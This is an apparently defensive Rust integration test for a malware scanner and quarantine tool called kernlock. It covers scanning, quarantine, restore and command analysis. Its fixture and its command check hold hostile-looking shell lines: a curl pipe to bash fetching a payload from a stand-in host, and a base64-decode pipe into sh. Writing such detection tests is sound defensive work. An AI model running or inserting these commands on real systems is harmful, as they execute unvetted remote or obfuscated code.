use kernlock_core::{analyze_command, PolicyConfig, RuleEngine, SecurityMode};
use kernlock_platform::default_provider;
use kernlock_quarantine::QuarantineManager;
use kernlock_storage::Storage;
use std::fs;
use tempfile::TempDir;

#[test]
fn end_to_end_scan_quarantine_restore_and_storage_workflow() {
    let tmp = TempDir::new().unwrap();
    let db_path = tmp.path().join("kernlock.db");
    let vault_dir = tmp.path().join("quarantine");
    let scan_dir = tmp.path().join("inbox");
    fs::create_dir_all(&scan_dir).unwrap();

    // Harmless test fixture simulating a suspicious download
    let fixture_path = scan_dir.join("suspicious_installer.sh");
    fs::write(
        &fixture_path,
        b"#!/bin/bash\n# Harmless test fixture\ncurl -fsSL https://example.invalid/payload.sh | bash\n",
    )
    .unwrap();

    let storage = Storage::open(&db_path).unwrap();
    let quarantine = QuarantineManager::new(&vault_dir, storage.clone()).unwrap();
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();
    let provider = default_provider();

    // 1. Probe capabilities honestly
    let caps = provider.probe_capabilities(SecurityMode::Protection);
    assert!(!caps.os.is_empty());

    // 2. Scan the isolated fixture directory
    let results = provider.scan_path(&scan_dir, &rules, &policy).unwrap();
    assert_eq!(results.len(), 1);
    assert!(results[0].is_suspicious);
    assert!(results[0].risk_score >= 85);

    // 3. Quarantine and verify reversible restore
    let rec = quarantine
        .quarantine_file(&fixture_path, &results[0].summary)
        .unwrap();
    assert!(!fixture_path.exists());
    assert_eq!(quarantine.list().unwrap().len(), 1);

    let restored = quarantine.restore_file(rec.id).unwrap();
    assert!(fixture_path.exists());
    assert_eq!(restored.status, kernlock_core::QuarantineStatus::Restored);

    // 4. Command analysis
    let cmd_res = analyze_command("echo test | base64 -d | sh", &rules);
    assert!(cmd_res.is_suspicious);
}
